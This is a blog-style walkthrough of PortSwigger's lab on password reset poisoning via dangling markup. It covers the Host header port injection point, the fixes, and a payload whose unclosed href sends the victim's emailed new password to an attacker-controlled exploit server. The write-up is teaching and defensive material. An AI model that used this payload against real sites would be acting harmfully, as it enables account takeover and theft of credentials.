---
title: "Password Reset Poisoning via Dangling Markup: How I Approached It"
date: 2026-10-18 13:00:00 +0530
categories: [Web Security, Host Header]
tags: [host-header, password-reset, dangling-markup, burp, portswigger]
---

## What this is

Password-reset emails often build a link (or other HTML) using a host value taken from the request. If that host is attacker-controlled, you can poison the email. Dangling markup is the upgrade: instead of replacing the whole host, you break out of an HTML attribute so everything that follows in the email, including a secret, gets pulled into a request to your server.

## The lab

PortSwigger's "Password reset poisoning via dangling markup." Goal: log in as `carlos`. Your own account is `wiener:peter`, and you can read emails on the exploit server. Important detail: this lab emails a *new password* in the body, not a reset-token link.

## What I noticed

A normal forgot-password for `wiener` produced an email whose rendered view was cleaned by DOMPurify, but the raw HTML view was not. The host from the request was reflected inside a single-quoted string in that HTML, and the new password appeared later in the same email.

Tampering with the Host domain itself errored. Adding a non-numeric port still worked and still sent the email:

~~~http
Host: LAB-ID.web-security-academy.net:arbitraryport
~~~

That port showed up, unescaped, inside the raw email HTML. That's the injection point.

## The dangling-markup payload

~~~http
Host: LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER.exploit-server.net/?
~~~

The unclosed `href` eats the rest of the line. When the victim "opens" the email, the browser (or the lab's simulated client) requests your exploit server with everything after the breakout, including the new password, stuck on the query string.

## Landing it on carlos

Same request, `username=carlos`. The exploit-server access log showed a `GET /?/login'>…` entry containing Carlos's new password. Logging in with that password solved the lab.

## Impact

Account takeover of anyone who can be made to trigger a password reset (or who has one triggered for them). The secret never needs to be guessed; it rides out of the email as part of a URL your server receives.

## How it gets fixed

- Never build email HTML from the `Host` header (or `X-Forwarded-Host`, etc.). Use a hard-coded canonical domain.
- HTML-encode every reflected value in emails. An unescaped quote is enough to turn reflection into dangling markup.
- Prefer not putting fresh passwords in email bodies at all; use short-lived reset tokens on a fixed domain.

The fix that doesn't work is "we sanitize the rendered email with DOMPurify." The raw HTML path, or the mail client's fetch of links, still leaks.

## What I'm still learning

I want to get faster at checking every host-related header (`Host`, `X-Forwarded-Host`, `Forwarded`) and always opening the *raw* email view, not just the pretty one.
